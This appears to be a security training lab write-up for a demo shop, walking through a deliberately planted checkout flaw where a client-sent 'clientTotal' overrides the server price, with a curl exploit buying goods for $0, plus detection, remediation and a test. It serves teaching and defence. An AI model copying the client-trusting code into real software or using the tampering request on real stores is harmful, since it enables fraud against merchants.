# Lab 03 — Trusting client prices at checkout (buy for $0)

- **OWASP:** A04 – Insecure Design (business-logic / client-trust flaw)
- **Severity (CVSS-ish):** High — `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N` (~7.1). Any
  customer pays an arbitrary amount (including `$0`) for real, stock-decrementing
  orders — direct financial loss.
- **Affected component:** core (`backend`)
- **Control normally enforcing this:** server-side recomputation of every monetary
  value in `CheckoutService.confirmCheckout(...)`; the endpoint takes **no
  client-supplied money** at all.

## 1. The weakness

On `main`, `POST /api/checkout/confirm` carries **no request body**. The server
derives the order entirely from server-owned state — the cart, the catalog price,
the validated coupon:

```java
// main — CheckoutController
public ApiResponse<OrderResponse> confirmCheckout(Authentication authentication) {
    User user = currentUserService.getCurrentUser(authentication);
    return ApiResponse.success(..., checkoutService.confirmCheckout(user));   // no body
}
```

```java
// main — CheckoutService (the control)
BigDecimal subtotal = calculateSubtotal(cart);                 // from catalog prices
BigDecimal discountTotal = couponService.calculateDiscount(coupon, user, subtotal);
BigDecimal total = subtotal.subtract(discountTotal).max(ZERO); // server-owned, period
```

The lab commit (`lab/03`) introduces a `CheckoutRequest` body with a
`clientTotal` field and — the actual bug — **lets it override** the recomputed
total:

```java
// vulnerable-lab — CheckoutService
BigDecimal total = subtotal.subtract(discountTotal).max(ZERO).setScale(2, HALF_UP);
if (request != null && request.clientTotal() != null) {
    total = request.clientTotal().setScale(2, HALF_UP);   // <-- trusts the client
}
```

`total` then becomes both the `Order` total **and** the `Payment` amount. The
server did the correct calculation and then discarded it in favor of an
attacker-controlled number. This is the canonical "never trust the client for
prices/totals" violation — and a violation of Aurora's stated first rule.

> Diff it: `git diff main -- backend/.../checkout/`

## 2. Exploit walkthrough

Local stack up, an authenticated customer with at least one item in the cart.

```bash
TOKEN=$(curl -s -X POST http://localhost:8088/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"customer@aurora.test","password":"Password123!"}' | jq -r '.data.token')

# Put a genuinely-priced item in the cart (say it totals $1,299.00).
curl -s -X POST http://localhost:8088/api/cart/items \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"variantId":"<some-variant-uuid>","quantity":1}'

# The attack: confirm checkout, but dictate the total.
curl -s -X POST http://localhost:8088/api/checkout/confirm \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"clientTotal": 0.00}' | jq '{number:.data.orderNumber, total:.data.total}'
```

**Observed result (vulnerable-lab):**

```json
{ "number": "AUR-1718...-A1B2C3D4", "total": 0.00 }
```

A real order is created, stock is decremented, the `ORDER_CREATED` event fires —
and the recorded total and the `Payment` amount are **$0.00** (or `0.01`, or any
value the attacker chooses). The customer received $1,299.00 of goods for free.

> The same class of bug appears if the client is trusted for **per-line unit
> prices** or **quantities-as-negative-numbers**; total-override is just the
> shortest demonstration.

## 3. Impact

- **Asset hit:** revenue / order integrity (a core asset in
  [`threat-model.md`](../threat-model.md)). Direct, unbounded financial loss.
- **Blast radius:** every checkout. Because the order is otherwise valid (stock
  moves, event fires, fulfillment proceeds), the loss is realized as shipped goods
  before anyone reconciles payment.

## 4. Detection

- **Reconciliation signal:** `order.total` (or `payment.amount`) that does not
  equal `Σ(line unit_price × quantity) − discount` is, by definition, tampered.
  A scheduled integrity check or a DB constraint/trigger would flag it.
- **Audit:** `ORDER_CREATED` is audited; enriching it with the recomputed vs.
  recorded total makes the anomaly obvious.
- **DAST/fuzzing:** sending unexpected JSON fields to an endpoint that "should"
  take none is exactly what NightVision/ZAP probe for (see
  [`security-testing.md`](../security-testing.md) §3).

## 5. Remediation (already on `main`)

`main` simply **never accepts** money from the client: the endpoint has no body,
and `total`, `subtotal`, `discountTotal`, per-line `unitPrice` and `lineTotal` are
all computed server-side from the cart and catalog. The coupon is re-validated
server-side (`couponService.validateCouponForCart`) and the discount recomputed —
the client cannot even name a discount amount.

Re-running the exploit against `main`: the extra JSON body is ignored, and the
order total is the true `$1,299.00` regardless of what `clientTotal` said.

Restore with `git checkout main -- backend/.../checkout/` (this also deletes the
`CheckoutRequest` DTO, which does not exist on `main`).

## 6. Regression test

**Honest status: not yet locked by a test.** [`security-testing.md`](../security-testing.md)
§4 lists the manual check *"Manipulated price/total/quantity in the request is
ignored (server recomputes)"* under A04, but there is no automated
`CheckoutService` test asserting it.

**Locking it in** (the test to add — pure service test, no client body trusted):

```java
// CheckoutPricingTest (proposed)
@Test
void checkoutTotalIsServerComputed_andClientSuppliedTotalIsIgnored() {
    seedCartWithItemPriced(user, new BigDecimal("1299.00"));

    OrderResponse order = checkoutService.confirmCheckout(user /*, no client total on main */);

    assertThat(order.total()).isEqualByComparingTo("1299.00");   // not 0.00
}
```

This is the same coverage gap the **checkout/payment test-layer track** targets:
`CheckoutService` is the single most security-critical service in the app
(it owns the money) and currently has **no** test class. Adding pricing +
authz tests there is the highest-value next step after this lab.
